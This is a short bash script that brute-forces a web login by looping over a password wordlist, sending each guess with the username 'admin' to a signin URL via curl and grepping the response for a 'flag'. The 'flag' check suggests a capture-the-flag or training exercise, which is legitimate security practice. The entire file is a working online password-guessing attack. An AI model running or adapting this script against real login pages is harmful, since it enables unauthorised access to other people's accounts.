#!/bin/bash

if [[ $# -ne 2 ]] ; then
    echo 'Usage ./bruteforce.sh <address> <password input file>'
    exit 0
fi

address="$1"
username="admin"
input="$2"

echo "[ Looping over $address with username $username using $input]"

while IFS= read -r password
do
    echo "Testing $password"
    # echo "http://$address/?page=signin&username=$username&password=$password&Login=Login#"
    flag="$(curl -Ss "http://$address/?page=signin&username=$username&password=$password&Login=Login#" | grep flag)"
    if [ $? -eq 0 ]; then
        echo "The password for $username is $password"
        echo $flag
        exit
    fi
done < "$input"

echo "None of the provided passwords match for username $username"